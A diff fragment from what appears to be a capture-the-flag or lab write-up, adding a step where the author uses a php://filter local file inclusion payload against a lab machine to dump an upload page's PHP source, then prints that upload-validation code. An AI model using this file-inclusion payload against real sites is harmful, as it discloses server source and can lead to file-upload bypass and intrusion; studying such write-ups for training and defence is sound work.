@@ -122,7 +122,51 @@ here is the users base64 encoded passwords, login to the site with one of them f
 
 i tried to upload a php file but i couldn't, after spending some time to find out how to upload a file i came to notinng then i decided to get the source php code of the page :
 
+```text
+http://192.168.127.133/?page=php://filter/convert.base64-encode/resource=upload
+```
 
+the php section contains the following code :
+
+```php
+<?php 
+if(isset($_POST['submit'])) {
+	if ($_FILES['file']['error'] <= 0) {
+		$filename  = $_FILES['file']['name'];
+		$filetype  = $_FILES['file']['type'];
+		$uploaddir = 'upload/';
+		$file_ext  = strrchr($filename, '.');
+		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
+		$whitelist = array(".jpg",".jpeg",".gif",".png"); 
+
+		if (!(in_array($file_ext, $whitelist))) {
+			die('Not allowed extension, please upload images only.');
+		}
+
+		if(strpos($filetype,'image') === false) {
+			die('Error 001');
+		}
+
+		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
+			die('Error 002');
+		}
+
+		if(substr_count($filetype, '/')>1){
+			die('Error 003');
+		}
+
+		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
+
+		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
+			echo "<img src=\"".$uploadfile."\"><br />";
+		} else {
+			die('Error 4');
+		}
+	}
+}
+
+?>
+```
 
 
 
